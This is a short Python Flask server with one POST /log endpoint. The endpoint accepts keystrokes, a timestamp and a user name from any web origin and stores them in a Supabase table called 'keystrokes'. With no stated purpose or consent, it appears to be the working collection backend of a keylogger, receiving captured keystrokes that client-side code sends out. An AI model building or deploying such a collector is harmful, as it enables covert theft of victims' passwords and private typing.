import flask, flask_cors
import supabase
import os
from supabase import create_client, Client
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env file

url: str = os.environ.get("SUPABASE_URL")
key: str = os.environ.get("SUPABASE_KEY")

if not url or not key:
    raise ValueError("SUPABASE_URL and SUPABASE_KEY environment variables are required")

supabase: Client = create_client(url, key)

app = flask.Flask(__name__)
flask_cors.CORS(app, resources={r"/*": {"origins": "*"}})

@app.route('/log', methods=['POST'])
def log():
    data = flask.request.get_json()
    if data and isinstance(data, dict) and 'keys' in data and 'timestamp' in data and 'user' in data:
        keys = data.get('keys', None)
        timestamp = data.get('timestamp', None)
        user = data.get('user', None)
        print(f"Keys: {keys}")
        print(f"Timestamp: {timestamp}")
        print(f"User: {user}")

        try:
            response = (
                supabase.table("keystrokes")
                .insert({"timestamp": timestamp, "keys": keys, "user": user})
                .execute()
            )
            print("Supabase response:", response)
            if response.status_code != 201:
                print(f"Error inserting data into Supabase: {response.error}")
                return flask.jsonify({"status": "error", "message": response.error}), 500
        except Exception as e:
            print(f"Error inserting data into Supabase: {e}")
            return flask.jsonify({"status": "error", "message": str(e)}), 500
        return flask.jsonify({"status": "success"}), 200
    else:
        return flask.jsonify({"status": "error", "message": "Invalid data format"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)